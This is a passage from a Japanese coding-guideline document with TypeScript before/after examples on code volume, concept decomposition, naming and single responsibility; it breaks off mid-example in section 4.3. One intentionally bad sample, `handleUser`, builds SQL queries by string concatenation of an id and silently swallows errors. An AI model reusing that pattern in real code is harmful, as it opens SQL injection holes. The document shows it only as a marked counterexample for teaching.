# コーディング指針

本ドキュメントは、私たちが良いコードを書き、良い状態を保ち続けるための共通の指針である。
すべての設計・実装・レビューは、この指針を判断の拠りどころとする。

> **根本思想：人間はそれほど賢くない。**
> だからこそ、難しいことを扱わなくても改修し続けられる、**概念が整理整頓されたプログラム**を目指す。
> 難しいプログラムはバグの温床である。「ごちゃっとしている」「あちこちへの影響を考えないとデグレしそう」と感じたら、それはたいてい良くないコードのサインであり、もっと良い書き方が必ずある。

---

## 目次

全体を4部でたどる。前半と後半で狙いが違う。第1部・第2部は**認知負荷を下げる**話——プログラム全体の"かたち"から個々のロジックへと**ズームインし**、読んで最短で理解できるコードにする。第3部・第4部は狙いが変わり、**正しく・壊れずに動かす**話——正常系の外側、すなわち異常系（第3部）と実行環境（第4部）に備える。

**第1部　概念で構造を作る** ── プログラム全体の"かたち"を概念で整える
1. [コードの量と本質](#1-コードの量と本質)
2. [概念を実装する](#2-概念を実装する)
3. [命名](#3-命名)
4. [責務と疎結合](#4-責務と疎結合)
5. [再利用と資産化](#5-再利用と資産化)

**第2部　ロジックを整える** ── 器の中身へズームインし、個々のロジックと計算量を素直に書く

6. [ロジックの書き方](#6-ロジックの書き方)
7. [副作用と不変性](#7-副作用と不変性)
8. [パフォーマンス（計算量）](#8-パフォーマンス計算量)
9. [非同期・並行処理](#9-非同期並行処理)

**第3部　異常と外部に備える** ── 正常系の外側。異常を握りつぶさず、内部を漏らさず、起きたことは追えるようにする

10. [エラーハンドリング](#10-エラーハンドリング)
11. [セキュリティ](#11-セキュリティ)
12. [ログと可観測性](#12-ログと可観測性)

**第4部　実行環境に備える** ── "自分の外の現実"（複数インスタンス・部分失敗）を前提に書く

13. [スケールアウトを前提に書く](#13-スケールアウトを前提に書く)
14. [トランザクションと整合性](#14-トランザクションと整合性)
15. [冪等性（リトライ・重複に耐える）](#15-冪等性リトライ重複に耐える)

**巻末**

16. [チェックリスト](#16-チェックリスト)

---

## 1. コードの量と本質

> いちばん認知負荷が低いのは、**そもそもコードが書かれていない状態**だ。読む対象が無ければ、バグも読む手間も生まれない。まず「書かない・減らす」で総量を絞り、書くと決めたものを次章「概念を実装する」で整える。

順序はシンプルで、まず ①**いらないものは書かない**（§1.1）、そのうえで ②**いるものは少なく書く**（§1.2）。

### 1.1 いらないものは書かない

「いつか使うかも」で書いたコードは、たいてい**使われないまま仕様だけが古びて負債になる**。呼ばれていないメソッド・参照されない型・受け取っても使われない引数などは、**あるほうが損**である。今この瞬間に必要なものだけを書き、不要になったものはその場で消す。

- 実装したら「これはどこから呼ばれるか？」を必ず確認する。呼び出し元が無いなら、そのコードは消す。
- **引数やオプションを受け取っておきながら、中で使っていない**状態を残さない。「`options` を受けているのに無視している」ような中途半端は、実装しきるか、消しきるかのどちらかにする。

```ts
// ✗ どこからも呼ばれていないのに残っているメソッド。読む人は「使われている前提」で追ってしまう
async cancelOrder(orderId: string) { /* 決済連携のリニューアルで使わなくなったが、消し忘れて残っている */ }

// ✗ options を受け取るのに、中で一切使っていない（実装が伴わないまま引数だけ生えた「書きかけ」）
function getUser(id: string, options?: { includeOrders?: boolean }) {
  return userRepository.findById(id); // includeOrders: true を渡しても注文は付いてこない＝呼び出し側を欺く
}

// ✓ いま実装されている機能だけを引数にする。必要になったら、そのとき実装ごと足す
function getUser(id: string) {
  return userRepository.findById(id);
}
```

未使用コードは「まだ動いているから」と放置されがちだが、**残っているだけで「使われているはず」という誤読を生み、認知負荷を上げる**。「書かない」は、まだ書いていないものを書かないことだけでなく、既に書いてしまったものを**消す**ことまで含む。

### 1.2 少なく書く

書くと決めたものは、できるだけ少なく書く。理由は単純で、**プログラムが多い ＝ バグの混入する余地が大きい**からだ。長く書くほど、それだけバグは入りやすくなる。だから、**整理整頓されている限りは、短ければ短いほど好ましい。**

- 実現したい処理の**本質的な論理展開**を捉えれば、コードは自然と少なく簡潔になる。
  （数学の問題に、驚くほど鮮やかな解法が存在することがあるのと同じイメージ。）
- ただし、概念の整理整頓（→ §2「概念を実装する」）を実現するための**形式的な行数の増加はアリ**。
  （例：意図を明確にするための関数分割や説明変数の導入。単に短いことより「整理されていること」が優先。）

```ts
// ✗ 本質を捉えられていないので長くなる
let names = [];
for (let i = 0; i < users.length; i++) {
  if (users[i].isActive) {
    names.push(users[i].name);
  }
}

// ✓ 「アクティブなユーザーの名前一覧」という本質をそのまま書く
const names = users.filter(u => u.isActive).map(u => u.name);
```

同じ発想で、**やりたいことを直接的に表現する記法・API が他にないか**を常に意識する。たとえば「存在するか」を判定したいなら、フラグとループで手続きを組み立てるのではなく、`some` という概念でそのまま書く。

```ts
// ✗ 「存在するか」を手続きで組み立てている
let found = false;
for (const item of items) {
  if (item.id === targetId) {
    found = true; break;
  }
}

// ✓ 概念として直接的
const found = items.some(item => item.id === targetId);
```

どちらの ✓ も、悪い例にあった**添字の操作・フラグの初期化・`break` の位置・ループの境界**が丸ごと消えている。バグはたいてい「手続きの隙間」に宿るものなので、その隙間ごと無くなるここまで短い形では、**むしろ間違えるほうが難しい**。「短いほど好ましい」とは、この"バグの入る余地そのものが消える"ことを指している。

この姿勢は**車輪の再発明をしない**ことにつながる。日付計算・ソート・重複排除・グルーピング・パス結合・URL 組み立てなどは、たいてい言語の標準機能や枯れた定番ライブラリに、エッジケースまで踏み固められた実装がある。手で書き起こすと、うるう年・多バイト文字・境界値といった落とし穴を自前で踏み抜くうえ、読み手も「この自作関数は何を保証するのか」を確かめる羽目になる。**まず"すでにある解"を探し、無いと分かってから書く。**

**「短い」＝「技巧的なショートハンドで文字数を減らす」ではない**

ここでいう「短い」は**概念が整理された結果として短い**ことであって、"賢い"記法で**文字数を減らす**ことではない。問題になるのは、「本来やりたいこと」を三項や論理演算の特性に押し込んで、**意図を記法の裏に隠してしまう**ケース。読み手はまず技巧を復元してから意図を読み取ることになり、認知負荷が上がる。

```ts
// ✗ 悪い例：割引率の決定ロジックを、三項と && / || の演算に押し込んでいる
const rate = user.isVip ? 0.2 : (user.years ?? 0) >= 3 && 0.1 || user.hasCoupon && 0.05 || 0;
```

`&& 0.1 || … && 0.05 || 0` が何をしているのか、演算子の優先順位を頭の中でたどらないと読めない。しかも `&&`/`||` に数値を混ぜているので、条件を1つ足すだけで壊れやすい。**式の構造そのものが「賢さ」に振れていて、意図がロジックの裏に隠れている**のが問題だ。

```ts
// ✓ 良い例：「上から順に条件を判定する」という概念をそのまま素直に書く
function discountRate(user: User): number {
  if (user.isVip) return 0.2;
  if ((user.years ?? 0) >= 3) return 0.1;
  if (user.hasCoupon) return 0.05;
  return 0;
}
```

行数はむしろ増えたが、上から読むだけで割引ルールが分かる。判断基準はいつも**「読み手が最短で理解できるか」**。**タイプ数ではなく、読む人の理解にかかる時間を減らす**のがゴールであり、ショートハンドはその手段にすぎない。

---

## 2. 概念を実装する

> 前章では「**コードは少ないほどよい**」という原則（いらないものは書かない・いるなら少なく書く）と、その手近な例を見た。ここからはそれを踏まえ、**書くと決めたコードを、実際にどう書くか**に進む。肝は、仕様をそのまま寄せ集めるのではなく、**概念**を組み立てることにある。

### 2.1 きれいなプログラム＝概念が整理整頓されているプログラム

**「このプログラムは何の処理をするか？」** と聞かれたとき、端的に答えられるようなプログラムでなければいけない。
「〜しつつ〜と〜と〜を行い、〜の〜に関する部分を行う」と長々説明しないといけないなら、そのメソッドは概念が整理されていないか、多くのことをやりすぎている。

```ts
// ✗ 何をする関数か一言で言えない。取得・検証・整形・業務判断・課金・メール・通知・
//   キャッシュ・分析・ログが全部絡み合い、フラグと再代入とネストで筋が追えない
async function handleUser(id: string, opts?: any) {
  let data: any = null;
  let ok = true;
  let msg = '';
  try {
    // 取得（SQL を文字列連結。しかも 2 回投げている）
    const r = await db.query("SELECT * FROM users WHERE id = '" + id + "'");
    data = r && r.length ? r[0] : null;
    if (!data) { ok = false; msg = 'no user'; }
    else {
      const r2 = await db.query("SELECT * FROM orders WHERE uid = '" + id + "'");
      data.orders = r2 || [];

      // 検証（バラバラの条件を直に）
      if (!data.email || data.email.indexOf('@') < 0) { ok = false; msg = 'bad email'; }
      if (data.status == 2) { ok = false; msg = 'banned'; } // 2 == 凍結？ どこにも定義なし

      if (ok) {
        // 整形＋業務判断がごちゃ混ぜ
        let rank = 'normal';
        let total = 0;
        for (let i = 0; i < data.orders.length; i++) {
          total = total + data.orders[i].amount;
          if (data.orders[i].amount > 10000) rank = 'gold'; // ループ内で上書きされ続ける
        }
        if (total > 100000) rank = 'platinum';
        data.rank = rank;
        data.age = Math.floor((Date.now() - new Date(data.birthday).getTime()) / 31536000000);
        const name = data.last_name + ' ' + data.first_name;

        // 課金（失敗しても握りつぶし）
        try {
          if (rank != 'normal') await billing.charge(id, rank == 'gold' ? 500 : 1000);
        } catch (e) { /* まあいいか */ }

        // メール・プッシュ・キャッシュ・分析・監査を全部ここで
        await mailer.send({ to: data.email, subject: 'ようこそ', body: name + ' さん、ようこそ！(' + rank + ')' });
        if (opts && opts.push !== false) {
          try { await push.notify(data.device_token, 'ランク: ' + rank); } catch (e) {}
        }
        cache[id] = data; // グローバルなオブジェクトを直に書き換え
        await db.query("INSERT INTO audit_log VALUES ('" + id + "','handleUser','" + new Date().toISOString() + "')");
        analytics.track('user_handled', { id: id, rank: rank, total: total });
        console.log('done ' + id + ' ' + rank + ' ' + total);
      }
    }
  } catch (e) {
    ok = false; msg = 'error';           // 何が起きたかは闇へ
  }
  return { ok: ok, msg: msg, data: data }; // 成功か失敗かは呼び出し側が msg 文字列で判定…
}
```

サンプルコードとしてあえてひどいコードを作ってみたのでこれは極端な例だが、このプログラムは「このメソッドは何をするメソッドですか？」に一言で答えられない。取得・検証・ランク判定・課金・メール・プッシュ・キャッシュ・監査・分析・ログが1つの器で絡み合い、`ok`/`msg`/`data` を引き回すフラグと、ループ内の再代入と、握りつぶした `try/catch` で、**どこで何が決まるのか追えない**。「メール文面を変えたい」だけでも、SQL・課金・分析まで載ったこの塊を丸ごと読む羽目になる。それぞれを名前の付いた一言の処理に切り出せば、フローが素直に読める。

```ts
// ✓ それぞれが一言で説明できる（詳細は各関数に隠れる）
const user = fetchUser(id);          // ユーザーを取得する
const profile = formatProfile(user); // 表示用に整形する
sendWelcomeMail(user);               // ウェルカムメールを送る
```

### 2.2 概念から仕様へ降りる

では、その"整理整頓された概念"は、どうやって作るのか。核心は、**仕様をそのまま実装するのではなく、その手前にある概念を実装する**ことにある。まず処理を抽象化して**概念**を取り出し、それらを処理フローの大枠（レール）として組み立てる。個々の仕様は、そのレールの上で実装する。

- 仕様にいきなり飛びつくと、場当たり的なコードが積み上がって収拾がつかなくなる（＝認知負荷が上がる）。
- **概念（抽象）から仕様（具体）へと降りていく**と、大きな流れを見失わずに済む。
- ⇔ ただし、納品物として最重要なのはあくまで**仕様**だということは忘れない。概念の整理は、その仕様を正しく・安全に実現するための手段にすぎない。

**込み入った処理を、複数の概念に分割して組み合わせる**
その基本形が、**1つの込み入った処理を、意味のある複数の概念（部品）に分解し、それらを組み合わせて全体を組み立てる**こと。§2.1 で見た「取得 → 整形 → 送信」の分割はその最小形で、ここではもう少し込み入った処理で考える。

例として「アップロードされた CSV から商品データを取り込む」処理を考える。このままでも十分実用に耐えるレベルではあるがさらにプログラムを整理するとどのようになるだろうか。

```ts
// ✗ 1つの関数に「ヘッダ検証・列分割・行検証・正規化・ドメイン変換」が全部混ざっている。
//   ループとフラグが絡み合い、何をどの順でやっているのか追わないと分からない
function importProducts(csv: string): ImportResult {
  const lines = csv.trim().split('\n');
  const products: Product[] = [];
  const errors: string[] = [];
  const header = lines[0].split(',');                                         // ヘッダ検証
  if (header.length !== 3 || header[0] !== 'name' || header[1] !== 'price' || header[2] !== 'sku') {
    return { ok: false, errors: ['ヘッダが不正です（期待: name,price,sku）'] };
  }
  for (let i = 1; i < lines.length; i++) {  // i=1: 見出し行を飛ばす
    const cols = lines[i].split(',');
    const lineNo = i + 1;                                 // ファイル上の行番号（見出しが1行目）
    if (cols.length !== 3) {                              // 検証
      errors.push(`${lineNo}行目: 列数が不正`);
      continue;
    }
    let rowOk = true;                                     // ← この行を商品化してよいかをフラグで引き回す
    if (cols[0].trim() === '') {                          // 検証（正規化 trim と混在）
      errors.push(`${lineNo}行目: 商品名が空`);
      rowOk = false;
    }
    if (cols[1].trim() === '' || Number.isNaN(Number(cols[1]))) { // 検証
      errors.push(`${lineNo}行目: 価格が数値でない`);
      rowOk = false;
    }
    if (!rowOk) continue;
    products.push({                                      // 正規化＋変換
      name: cols[0].trim(),
      price: Number(cols[1]),
      sku: cols[2].trim().toUpperCase(),
    });
  }
  if (errors.length) {                                   // 1件でもエラーがあれば取り込まない
    return { ok: false, errors };
  }
  saveProducts(products);                                // 全件そろって初めて DB へ書き込む
  return { ok: true, count: products.length };
}
```

整理後のコードはこのようになる。
```ts
type ImportResult =
  | { ok: true; count: number }
  | { ok: false; errors: string[] };

type RowResult =
  | { ok: true; product: Product }
  | { ok: false; errors: string[] };

type RowsResult =
  | { ok: true; products: Product[] }
  | { ok: false; errors: string[] };

// ✓ 何をしているか？ → CSV を商品として取り込む
//
// before: 取得・ヘッダ検証・行検証・正規化・保存が1つの関数に絡み合い、ok/errors/rowOk を引き回していた
// after:  「ヘッダ検証 → 全行解釈 → 保存」の3ステップを順に呼ぶだけにする
//
// 各ステップを名前の付いた関数に委ね、本体は処理のあらすじ（アウトライン）だけを持つ
function importProducts(csv: string): ImportResult {
  // ヘッダと取り込みデータを分離
  const [headerLine, ...rows] = csv.trim().split('\n');

  // まずヘッダを検証
  const headerError = validateHeader(parseCsvLine(headerLine));
  if (headerError) {
    return { ok: false, errors: [headerError] };
  }

  // 続いて全データ行を解釈（全部成功なら商品全件、1件でも失敗ならエラー全件）
  const result = parseRows(rows);
  if (!result.ok) {
    return { ok: false, errors: result.errors }; // 1件でもエラーがあれば取り込まない
  }

  // 保存
  saveProducts(result.products);                   // 全件そろって初めて DB へ保存
  return { ok: true, count: result.products.length };
}

// 何をしているか？ → 1行を「,」で区切ってフィールドの配列にする
//
// before: lines[0].split(',') と lines[i].split(',') が別々の箇所にベタ書きされていた
// after:  「1行を区切る」処理に名前を与え、ヘッダ・データ行の両方から呼ぶ
//
// 同じ字句処理の重複を1箇所に集約している
const parseCsvLine = (line: string): string[] => line.split(',');

const REQUIRED_COLUMNS = ['name', 'price', 'sku'] as const;

// 何をしているか？ → ヘッダを検証する
//
// before: 「n個目の項目名はxxxxか」を項目の数だけ確認する
// after: 「ヘッダの各項目はすべて想定の値か」を確認する
//
// afterの方ではREQUIRED_COLUMNSを定義しeveryメソッドのループで回すことで判定処理を抽象化して整理している
function validateHeader(headers: string[]): string | null {
  const matches = headers.length === REQUIRED_COLUMNS.length
    && REQUIRED_COLUMNS.every((col, i) => headers[i] === col);
  if (!matches) {
    return `ヘッダが不正です（期待: ${REQUIRED_COLUMNS.join(',')}）`;
  }
  return null;
}

// 何をしているか？ → 全データ行を解釈し、成功（商品全件）か失敗（エラー全件）にまとめる
//
// before: for ループ内で、行番号計算・検証・正規化・push・エラー集約が一緒くたに回っていた
// after:  ループは各行を parseRow に渡し、成功→products / 失敗→errors の振り分けに徹する
function parseRows(rows: string[]): RowsResult {
  const products: Product[] = [];
  const errors: string[] = [];
  for (const [i, line] of rows.entries()) {
    const result = parseRow(line, i + 2); // i+2 = 見出し行の次からの行番号
    if (result.ok) {
      products.push(result.product);
    } else {
      errors.push(...result.errors);
    }
  }

  if (errors.length > 0) {
    return { ok: false, errors }; // 1件でも失敗があれば、エラー全件を返す（保存させない）
  }

  return { ok: true, products };
}

// 何をしているか？ → 1行を1つの商品に解釈する（できなければその行のエラー一覧）
//
// before: ループ本体で rowOk フラグを立てながら、検証と正規化が混在して進んでいた
// after:  「分割 → 検証 → 正規化」を順に呼び、検証で失敗したら即 return する
function parseRow(line: string, lineNo: number): RowResult {
  const cols = parseCsvLine(line);          // 分割：フィールドの配列に
  const errors = validateRow(cols, lineNo); // 検証：その行の問題を"全部"集める
  if (errors.length) {
    return { ok: false, errors };
  }

  const product = normalizeRow(cols);       // 正規化：trim・数値化してドメインオブジェクトに
  return { ok: true, product };
}

// 何をしているか？ → 1行の問題点を洗い出す（無ければ空）
//
// before: if (cols[0].trim()==='') {... rowOk=false} と、検証結果を rowOk フラグで持ち回っていた
// after:  その行の問題を errors 配列に集めて返すだけにする
function validateRow(cols: string[], lineNo: number): string[] {
  const errors: string[] = [];
  if (cols.length !== REQUIRED_COLUMNS.length) {
    errors.push(`${lineNo}行目: 列数が不正`);
    return errors; // 列数が違えば、以降の項目チェックは無意味
  }
  const [name, price] = cols;
  if (name.trim() === '') {
    errors.push(`${lineNo}行目: 商品名が空`);
  }
  if (price.trim() === '' || Number.isNaN(Number(price))) { // 空や非数値は 0 に化けさせず弾く
    errors.push(`${lineNo}行目: 価格が数値でない`);
  }
  return errors;
}

// 何をしているか？ → 検証済みの1行を、商品オブジェクトに整える
//
// before: products.push({ name: cols[0].trim(), ... }) と、整形が push と同じ場所に埋まっていた
// after:  検証済みの列を受け取り、商品オブジェクトを組み立てて返すだけにする
const normalizeRow = (cols: string[]): Product => {
  const [name, price, sku] = cols;
  return {
    name:  name.trim(),
    price: Number(price), // 検証済みなので数値化できる
    sku:   sku.trim().toUpperCase(),
  };
};
```

`✗` と `✓` の差は、各メソッドに付けた **`何をしているか？ → / before: / after:`** のコメントを追うのが早い。`✗` では1つの関数に絡み合っていた関心事——ヘッダ検証・行検証・`rowOk` フラグ・正規化・集約——が、`✓` では**1メソッド＝1関心事**にほどけている。

そして切り出したどのメソッドも、§2.1 の問い「このプログラムは何の処理をするか？」に **`何をしているか？ →` の一行で答えられる**。それが「概念の単位に割れている」ということだ。逆に、答えに「〜しつつ〜も」と長々と語る必要があるメソッドがあれば、まだ役割が混ざっているサインになる。

本体の `importProducts` を読むだけで、「**ヘッダ検証 → 各データ行を解釈 → 全件そろえば保存、1件でも駄目なら中止**」という処理のあらすじが分かる。1行の解釈の中身（**分割 → 検証 → 正規化**）を知りたくなったら `parseRow` へ降りればよい。各概念は独立しているので、
- ヘッダの検証ルールが変われば `validateHeader` だけ、
- 行の検証ルールが増えれば `validateRow` だけ、
- 正規化ルール（全角半角・大文字化など）の変更なら `normalizeRow` だけ

を直せばよい。**「どこを直せば何が変わるか」が概念の単位で一対一に決まる**のが、分割して組み合わせることの効き目。

---

## 3. 命名（名前警察）

> 概念を切り出したら、それが読めるようにする——**概念にラベルを貼る**のが命名。名前が概念を正しく指していないと、せっかくの整理が伝わらない。

ファイル名・クラス名・メソッド名・変数名は、その**概念・役割・処理内容を端的に表すセマンティックな命名**とする。

名前が行き届いたコードは、**メソッド名や変数名を眺めるだけで処理の概要がわかる**。
＝ 普通の文章を読むようにプログラムを流し読みできる。

> **「名前警察」という言葉について**
> これは「名前にうるさく、妥協せず向き合おう」という姿勢を表すための、あえておどけた言い回し。
> 良い名前は一発で決まらないことも多く、しっくりこなければ後から何度でも改名してよい。レビューで名前に注文を付け合うのも、粗探しではなく「読みやすさをチームで守る」ための健全な行為、というニュアンスで使っている。

```ts
// ✗ 名前から何も読み取れない
function proc(d: Coupon[], t: Date): Coupon[] {
  return d.filter(x => x.e < t);
}

// △ 一見よさそうだが、第2引数の名前が実態と合っていない
function findExpiredCoupons(coupons: Coupon[], now: Date): Coupon[] {
  return coupons.filter(coupon => coupon.expiresAt < now);
}

// ✓ 引数で受け取る時点は「システムの現在時刻」とは限らないので、"now"という命名は不適切。
//    "判定の基準となる時点" という実態を名前にする
function findExpiredCoupons(coupons: Coupon[], asOf: Date): Coupon[] {
  return coupons.filter(coupon => coupon.expiresAt < asOf);
}
```

> **こういう問い直しが「名前警察」**
> `now` という名前は「システムの現在時刻」を強く連想させる。しかし、この関数は時点を**引数で受け取っている**——つまり呼び出し側が任意の日時を渡せる。「先月末時点で期限切れだったクーポンを調べる」「テストで時刻を固定する」といった使い方では、渡ってくるのは現在時刻ではない。
> だから「この `now`、本当に"今"？ 引数で受けるなら"基準時点"では？」と立ち止まり、`asOf`（〜時点）へ直す。この**名前の実態を1つずつ問い直す営みそのものが「名前警察」**であり、レビューで交わすべき会話でもある。

**指針**
- 具体的・意味のある語を選ぶ（`get` より `fetch` / `download` など状況に合う語）。
- 真偽値は `is` / `has` / `can` / `should` を付け、否定形を避ける（`use_ssl` ○ / `disable_ssl` ✗）。
- 単位や属性を名前に込める（`delay` → `delaySec`）。
  - 名前は値の**実態**（生の文字列か、加工済みか）まで表す。`password` という裸の名前は「生のパスワードか、ハッシュ済みか」という実態を隠してしまうので、`plaintextPassword` / `hashedPassword` と実態を出して書き分ける。片方だけ裸の `password` にすると、読み手は中身を推測させられ、取り違え（生の値をそのまま保存する等）を招く——**実態を名前に出しておけば、その取り違えごと起こらない**（結果としてセキュリティ事故も防げる、というのは副次的な効果）。
  - ※ パスワードは復号可能な「暗号化」ではなく不可逆な「ハッシュ化」で保管するのが通常なので、`encryptedPassword` より `hashedPassword` が実態に正確。

### 名前が概念を表していれば、長い処理でもフローが読める

ある程度まとまった長い処理でも、各ステップに適切な名前が付いていれば、**本文の中身を読まなくても処理のフロー（概念の展開）が追える**。

ここでは、ECサイトで商品を注文するときのプログラムを考えてみる。
```ts
// 「カートが空でないか確認 → 在庫切れを除外 → 金額計算 → 決済 → 注文確定 → 確認メール → レシート発行」
// という流れが、そのまま自然言語の箇条書きのように読める
async function checkout(cart: Cart, user: User): Promise<Receipt> {
  assertCartIsNotEmpty(cart);
  const availableCart = removeOutOfStockItems(cart);
  const price = calcPrice(availableCart, user);
  const payment = await chargePayment(user, price);
  const order = await placeOrder(availableCart, payment);
  await sendOrderConfirmationMail(user, order);
  return issueReceipt(order);
}
```

この `checkout` を読むのに、`removeOutOfStockItems` や `chargePayment` の中身を開く必要はない。
名前が概念を語っているので、**上位の関数は「処理のあらすじ」だけを見せる**。詳細を知りたくなったときだけ、その関数へ降りていけばよい。

### 処理だけでなく"値"にも名前を（マジックナンバー）

ここまでは関数や変数——概念の"入れ物"に名前を付ける話だった。同じことは、コードに直接書かれた**裸の値（マジックナンバー／マジック文字列）**にも当てはまる。下記の例では、`90` や `3` はそれ自体が概念（「非アクティブと見なす日数」「まとめ買いの最小点数」）を持つのに、書きっぱなしではその概念が名前を持たず、隠れてしまう。

```ts
// ✗ 90 と 3 が何者なのか、その場では読み取れない。
//   しかも同じ 90 が別の箇所にもコピーされ、変えるとき片方を直し忘れる
if (daysSinceLogin > 90) suspendAccount();
if (order.items.length > 3) applyBulkDiscount();
```

```ts
// ✓ 値に概念名を与える。定義を見れば意味が分かり、変更も一箇所で済む
const INACTIVE_DAYS_THRESHOLD = 90;
const BULK_DISCOUNT_MIN_ITEMS = 3;

if (daysSinceLogin > INACTIVE_DAYS_THRESHOLD) suspendAccount();
if (order.items.length > BULK_DISCOUNT_MIN_ITEMS) applyBulkDiscount();
```

- 判断基準は「その数値・文字列が**概念を持っているか**」。持つなら名前を付ける。
- 逆に意味が自明な値（`0` や、`arr.length - 1` の `1` など）まで機械的に定数化する必要はない。**目的は、隠れた概念を名前で表に出すこと**。
- §2.2 の `REQUIRED_COLUMNS` はまさにこれで、「必須列」という概念に名前を与えたから、ヘッダ検証も正規化もその1つの定義を参照でき、列が変わっても直すのは1箇所で済んでいる。

---

## 4. 責務と疎結合

> 名前で概念が見えるようになったら、次は概念どうしの**境界**を守る。各単位に「自分の役割」だけをやらせ、よそ様の都合を混ぜない。

### 4.1 責務を意識する

**このファイル（クラス／関数／変数）の本質的な役割は何か？** を常に考え、役割に見合わないことをやらせない。責務は特定の粒度に限った話ではなく、**変数・関数・クラス・モジュール・層のどのスケールでも同じ**——「1つの単位は、1つの役割だけを持つ」。

この章は、その"1単位1役割"を**小さい器から大きい器へ**と順にたどる。

- **4.2 変数** … 1つの変数に、1つの意味だけを持たせる。
- **4.3 関数** … 呼び出し元に忖度せず、決められた仕事だけをする。
- **4.4 クラス** … 1つのクラスは、1つの役割・1つの抽象度に揃える。
- **4.5 モジュール** … 依存の向きを、責務の上下で決める。
- **4.6 層** … 下層（計算・API）は、上層（表示）の都合を背負わない。

続く **4.7 継承より委譲**・**4.8 コンポーネント** は、この梯子の延長線上にある——同じ"1単位1役割"を、クラス間の再利用（4.7）と画面の部品（4.8）に当てはめたものだ。

スケールが変わっても、問い方は一つだけ。「**この器の役割は何か。よそ様の仕事まで抱え込んでいないか**」。

### 4.2 変数の責務 ── 1つの変数に複数の意味を持たせない

まずは最小の器、**変数**から。

変数にも「責務」がある。**1つの変数は1つの意味だけを持つ。** これが破れる主な形が (A) 1つの変数を**2つの異なる意味で使い回す**こと。そして最後に、(B) 同じ責務が変数の**型（列挙）**にも及ぶことを確認する。

**(A) 1つの変数を2つの意味で使い回さない**

似ているからといって、意味の異なる2つの値を同じ変数で使い回すと、片方の都合で入れた値がもう片方の文脈で誤って使われ、バグになる。

**某プロジェクトで実際にあった例のオマージュ：店舗番号**
ログイン中のユーザーから店舗情報（＝所属店舗と、その店舗にアサインされた権限）を取得する。
店舗の権限によって、検索を店舗番号で絞り込むか／全店舗を対象にするかが変わる、という要件があるとする。

このとき、意味の違う2つの値を混同してはいけない。

- **所属店舗の店舗番号**（`userStoreNo`）… 「このユーザーがどの店舗の人か」という事実。常に確定している。
- **検索条件に含める店舗番号**（`filterStoreNo`）… 「検索をどの店舗で絞るか」という条件。全店舗を見られる権限なら**絞らない（＝無し）**。

```ts
// ✗ 悪い例：1つの storeNo に「所属店舗」と「検索条件」の2つの意味を持たせている
function searchOrders(user: LoginUser, params: SearchParams): Order[] {
  // ログイン中の所属する店舗の情報を取得
  const store = fetchStore(user.userId);

  // 「検索条件」のつもりで storeNo を用意し、絞り込むときだけ代入する
  let storeNo: number | undefined;
  if (!store.canViewAllStores) {
    storeNo = store.storeNo; // 全店舗権限が無いときだけ所属店舗で絞る
  }
  // → 全店舗権限のときは storeNo が undefined のまま

  // ところが後段では、同じ storeNo を「所属店舗の番号」として使ってしまう。
  // 全店舗権限のユーザーだと undefined が紛れ込み、監査ログが壊れる
  logAccess(user.userId, storeNo);          // 所属店舗を残したいのに、全店舗権限だと undefined
  return orderRepository.search(params, storeNo);
}
```

`storeNo` を「検索条件」の意味で組み立てたのに、後段で「所属店舗番号」としても使ったのが事故の元。
1つの変数に2つの意味を持たせたせいで、**片方の都合（絞らないので未設定）がもう片方の文脈（所属店舗が欲しい）を壊した。**

```ts
// ✓ 良い例：意味ごとに変数を分ける。それぞれが1つの意味しか持たない
function searchOrders(user: LoginUser, params: SearchParams): Order[] {
  const store = fetchStore(user.userId);

  // 事実：このユーザーの所属店舗（常に確定・不変）
  const userStoreNo: number = store.storeNo;

  // 条件：検索で絞り込む店舗番号。全店舗権限なら「絞らない」= undefined
  const filterStoreNo: number | undefined = store.canViewAllStores ? undefined : userStoreNo;

  logAccess(user.userId, userStoreNo);      // 所属店舗は常に正しい値を使える
  return orderRepository.search(params, filterStoreNo); // 検索条件は独立して扱える
}
```

ポイントは、**「所属店舗（事実）」と「絞り込み条件（絞る／絞らない）」を別々の変数で持つこと**。
所属店舗は常に確定する事実なので `userStoreNo` に必ず入れておき、絞り込み条件は別概念として `filterStoreNo`（絞らないなら `undefined`）で表す。
変数を分けた瞬間に、「所属店舗が欲しい場面で条件用の値（未設定）を掴む」という取り違えが、そもそも起こりようがなくなる。

**(B) 列挙に複数の軸を混ぜない ── 変数の"型"にも同じ責務がある**

(A) は「1つの変数に1つの意味」という話だった。同じ責務は、その変数が**取りうる値の集合＝型**にもある。状態や種別を `enum`（や文字列リテラルの union）で列挙するとき、**並べた値が本当に"対等"か**を疑う。列挙とは「同じ土俵にある、互いに排他的な選択肢」を並べる道具で、ここに**軸（次元）の違う概念**を混ぜると、1つの型が2つの意味を背負い、組み合わせのたびに値が増殖して破綻する。

```ts
// ✗ 「会員種別」に、"役割"と"状態"という別の軸が混ざっている
type UserType = 'admin' | 'member' | 'guest' | 'suspendedMember' | 'suspendedAdmin';
//  suspended（凍結）は member/admin と対等ではなく、"役割 × 状態" の掛け算。
//  役割が増えるたび凍結版も要り、値が組み合わせ爆発する
```

`suspendedMember` は「役割（member）」と「状態（凍結）」という**直交する2軸**を1つの値に押し込んだもので、`member` と対等な選択肢ではない。役割が3種になれば凍結版も3つ要る。これは (A) で `storeNo` に2つの意味を持たせたのと同じ構図——**1つの型が複数の軸を抱え込んでいる**。

```ts
// ✓ 直交する軸は、別々の概念（フィールド）に分ける。各列挙は対等な値だけになる
type Role = 'admin' | 'member' | 'guest';       // 役割の軸（互いに対等・排他）
type AccountStatus = 'active' | 'suspended';     // 状態の軸（互いに対等・排他）

interface User {
  role: Role;
  status: AccountStatus;
}
```

軸を分ければ各列挙は**対等な値だけ**になり、役割と状態は独立に増やせる。「この列挙、`suspendedMember` のように"◯◯かつ××"な値が紛れていないか？ 実は別の軸では？」と問い、型が背負う概念を1つに保つ。

> 逆に、値どうしが本当に対等で排他なら列挙は最良の道具になる。たとえば注文状態 `OrderStatus`（pending/paid/shipped…）は、注文が同時に2つの状態を取らない＝互いに対等で排他だからこそ、1つの列挙にきれいに収まる。

### 4.3 関数の責務 ── お役所仕事に徹する

器を一つ大きくして、変数を扱う**関数**へ。関数は呼び出し元に**一切忖度しない**——これがお役所仕事。

- プログラム本人は、自分が誰から呼ばれているのかを意識しない。
- 誰から呼ばれても、ただただ決められたことだけをやる。
- このお役所仕事の**階層的な組み合わせ**によって、すべての仕様が実現されている状態を目指す。

```ts
// ✗ 呼び出し元の画面種別ごとに処理を分岐させ、呼び出し元画面の事情に忖度している（＝結合している）
function formatDate(date, screen) {
  if (screen === 'invoice') return `${date.getFullYear()}年${date.getMonth() + 1}月`;
